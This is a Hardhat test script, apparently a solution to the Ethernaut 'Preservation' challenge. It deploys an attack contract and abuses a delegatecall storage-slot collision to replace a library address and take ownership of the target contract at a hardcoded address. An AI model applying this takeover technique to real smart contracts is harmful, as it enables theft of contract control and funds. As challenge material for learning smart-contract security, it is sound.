import { expect } from "chai";
import { Attack, Preservation } from "../typechain-types";
import { ethers } from "hardhat";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { getContractFactory } from "@nomiclabs/hardhat-ethers/types";

describe("Preservation exploit using delegate call fun", function () {
  let attackerContract: Attack,
    contractAddress: string,
    preservationContract: Preservation,
    attacker: SignerWithAddress,
    owner: string;

  //Exploit takes place in deployment
  before("Setup for attack locally", async function () {
    // Setup deployment for library contracts
    [attacker] = await ethers.getSigners();

    contractAddress = "0x59b09d6C6Da31eA5c7Be495BCa7A18E9c2cd5d2F";

    preservationContract = await ethers.getContractAt(
      "Preservation",
      contractAddress
    );

    const attackerContractFactory = await ethers.getContractFactory("Attack");

    attackerContract = await attackerContractFactory.deploy(
      preservationContract.address
    );

    await attackerContract.deployed();
  });

  it("perform exploit", async function () {
    // NOTE: The delegate call is context preserving. The contract making the call preserves state
    console.log(
      "The owner before the attack is",
      await preservationContract.owner()
    );

    let oldLibraryAddress = await preservationContract.timeZone1Library();

    // Step 1 Stored time of the calling contract is at slot 1. Let's have the attacker contract call setFirstTime and pass in the address casted as uint. timeZone1library slot will now be my attacker contract
    let txSetLibraryToAttackAddress =
      await attackerContract.setLibraryToAttackAddress({
        gasLimit: 21000000,
      });

    await txSetLibraryToAttackAddress.wait();

    // Check and see that the address of the library has changed like we intended  address of

    let newLibraryAddress = await preservationContract.timeZone1Library();

    console.log("The first timzone library address is ", oldLibraryAddress);

    console.log(
      "The new library 1 address is (should be attacker contract address)",
      newLibraryAddress
    );

    // Step 2 The attacker contract will have 3 storage slots, address buffer, address buffer, uint owner and a function called setTime. This setFirstTime will be called again and it will set the owner as address(this)

    let txSetOwnerOfPreservationContract =
      await attackerContract.SetOwnerOfPreservationContract({
        gasLimit: 21000000,
      });

    await txSetOwnerOfPreservationContract.wait();

    owner = await preservationContract.owner();

    console.log("The owner after the attack is ", owner);
  }).timeout(30000000);

  after("confirm exploit", async function () {
    // check that the new owner of the preservation contract is indeed my address
    expect(owner).to.be.eq(attacker.address);
  });
});
